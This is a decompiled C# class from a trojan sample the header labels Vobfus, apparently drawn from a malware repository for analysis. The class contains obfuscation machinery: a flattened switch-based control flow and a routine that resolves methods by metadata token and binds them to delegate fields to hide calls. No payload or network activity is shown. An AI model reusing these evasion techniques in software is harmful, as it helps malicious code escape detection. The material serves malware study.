// Decompiled with JetBrains decompiler
// Type: c.Candidates.RegIdentifierCandidate
// Assembly: c, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CCB3E154-F36D-403E-8019-8861E9AEB8FC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Vobfus.gen-191db013c67081442ef5e75edd00c2572f6ec9d7f629ddac9bba8942722c061d.exe

using GLuaR.Importers;
using System;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace c.Candidates
{
  internal class RegIdentifierCandidate
  {
    internal static Module _DispatcherWrapper;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void ViewAccount(int typemdt)
    {
      int num1 = 5;
      while (true)
      {
        Type type;
        FieldInfo[] fields;
        int index;
        int num2;
        FieldInfo fieldInfo;
        switch (num1)
        {
          case 0:
          case 5:
            type = RegIdentifierCandidate._DispatcherWrapper.ResolveType(33554432 + typemdt);
            if (true)
            {
              num1 = 4;
              continue;
            }
            goto case 1;
          case 1:
            if (index < fields.Length)
            {
              fieldInfo = fields[index];
              goto case 2;
            }
            else
            {
              num2 = 6;
              break;
            }
          case 2:
          case 3:
            MethodInfo method = (MethodInfo) RegIdentifierCandidate._DispatcherWrapper.ResolveMethod(fieldInfo.MetadataToken + 100663296);
            fieldInfo.SetValue((object) null, (object) (MulticastDelegate) Delegate.CreateDelegate(type, method));
            ++index;
            goto case 1;
          case 4:
            fields = type.GetFields();
            index = 0;
            num2 = 1;
            break;
          case 6:
            goto label_3;
          default:
            num1 = 2;
            continue;
        }
        num1 = num2;
      }
label_3:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public RegIdentifierCandidate()
    {
      ImporterMapper.InitAccount();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static RegIdentifierCandidate()
    {
      ImporterMapper.InitAccount();
      RegIdentifierCandidate._DispatcherWrapper = typeof (RegIdentifierCandidate).Assembly.ManifestModule;
    }

    internal static bool ChangeRegistry() => true;

    internal static bool RegisterRegistry() => false;

    internal delegate void ParameterThreadFilter(object o);
  }
}
